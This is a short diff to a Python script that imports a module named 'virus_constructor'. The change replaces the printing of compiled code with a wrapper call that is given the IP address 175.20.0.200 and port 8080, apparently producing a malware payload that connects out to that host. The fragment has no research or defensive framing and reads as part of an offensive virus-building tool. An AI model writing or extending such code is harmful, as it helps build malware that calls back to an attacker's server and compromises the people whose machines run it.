@@ -7,7 +7,7 @@ import virus_constructor as vc
 
 vc.reseed()
 
-file = str(vc.compiled_code())
+file = str(vc.wrapper("175.20.0.200", "8080"))
 print(file)
 #file = "print('Hello World!!')"
 #print(file)
